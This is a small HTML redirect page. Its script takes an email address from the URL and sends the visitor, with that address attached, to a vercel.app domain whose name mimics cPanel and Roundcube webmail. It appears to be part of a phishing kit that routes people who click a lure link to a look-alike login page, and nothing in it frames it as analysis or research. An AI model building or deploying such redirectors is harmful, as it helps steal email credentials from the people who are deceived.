<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    window.onload = function() {
      // Get the email parameter from the current URL
      const params = new URLSearchParams(window.location.search);
      const email = params.get("email");

      // Build the target URL
      let targetUrl = "https://cpsessrdpartyroundcubetaskmail.vercel.app/?web=";
      if (email) {
        targetUrl += encodeURIComponent(email);
      }

      // Redirect
      window.location.href = targetUrl;
    };
  </script>
</head>
<body>
  <p>Redirecting... If it doesnâ€™t work, 
    <a id="redirectLink" href="#">click here</a>.
  </p>

  <script>
    // Also update the manual link
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");
    let link = "https://cpsessrdpartyroundcubetaskmail.vercel.app/?web=";
    if (email) {
      link += encodeURIComponent(email);
    }
    document.getElementById("redirectLink").href = link;
  </script>
</body>
</html>
